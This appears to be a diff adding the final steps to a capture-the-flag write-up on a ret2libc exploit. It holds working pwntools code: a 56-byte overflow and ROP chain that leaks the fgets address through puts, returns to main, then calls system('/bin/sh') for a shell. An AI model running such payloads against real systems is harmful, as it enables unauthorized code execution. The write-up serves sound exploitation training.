@@ -99,7 +99,18 @@ got_puts_address = p64(binary.got.puts)
 got_fgets_address = p64(binary.got.fgets)
 ```
 
-### Actual leaking
+We need to be careful when crafting the payload. We first need to cause a buffer overflow and than leak the address. We also need to keep an eye on the padding, thats why I included a `ret`:
+
+```python
+payload = b"A"*56
+payload += ret
+payload += pop_rdi_ret + got_fgets_address + plt_puts_address
+payload += ret + main_address
+```
+
+After the leaking we don't want the programm to crash, because the addresses would change, so we simply call main again.
+
+### Leaking the address
 
 ```python
 from pwn import *
@@ -181,3 +192,29 @@ This will result in those lines of code:
 str_bin_sh = p64(fgets_leak + 0x1592f8)
 system_address = p64(fgets_leak - 0x2e610)
 ```
+
+### Getting the RCE
+
+With the symbols `str_bin_sh` and `system` we can basically call a function through a buffer overlow that is acting as `system("/bin/sh")` and giving us a RCE.
+
+Since we are on in main again, we need to go to the place where we can cause the buffer overflow and than send out payload.
+
+```python
+p.sendline(b"HackTWK")
+output = p.recvuntil(b": ")
+print(output)
+
+# payload = b"abcdefghijklmnopqrstuvwxyz123456" + b"A"*24
+payload = b"A"*56
+payload += ret
+payload += pop_rdi_ret + p64(fgets_leak + 0x1592f8) # str_bin_sh
+payload += p64(fgets_leak - 0x2e610) # system
+
+# will be a call to: system("/bin/sh")
+
+p.sendline(payload)
+
+p.interactive()
+```
+
+After that, we will get RCE.
